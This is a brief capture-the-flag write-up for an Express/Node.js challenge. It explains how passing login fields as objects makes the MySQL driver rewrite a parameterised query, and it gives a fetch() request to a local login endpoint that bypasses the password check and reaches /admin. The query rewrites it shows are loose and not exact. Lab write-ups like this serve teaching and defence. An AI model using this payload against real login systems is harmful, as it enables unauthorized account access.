# it's time to duel

This is a SQLi challenge via express.js and node.js
The idea is bypass the prepeared statments by changing the type of the variable as object so it becomes as follows:

Original query:

```sql
'SELECT * FROM accounts WHERE username = ? AND password = ?
```

Will become after changing the type of password to object :

```sql
'SELECT * FROM accounts WHERE username = ? AND password = password =1 ?
```

Therefore:

```sql
'SELECT * FROM accounts WHERE username = ?
 ```

Then it will access `/admin` endpoint

Based on this the request should be like this:
```
fetch("http://localhost:3000/api/login", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "content-type": "application/x-www-form-urlencoded",
    "upgrade-insecure-requests": "1",
    "cookie": "G_ENABLED_IDPS=google; connect.sid=s%3A_xHJWE0OAnexvgZz_0sOQCncUyq3ShBE.zsbOLDCQz2OyLNCAfr7Tw%2B3kU1c71VL8AcwjmrKD5a0",
    "Referer": "http://localhost:3000/login",
  },
  "body": "username[username]=1&password[paasword]=1",
  "method": "POST"
});
```

After that a new endpoint will be accessible `/admin`
Then we can access the flag
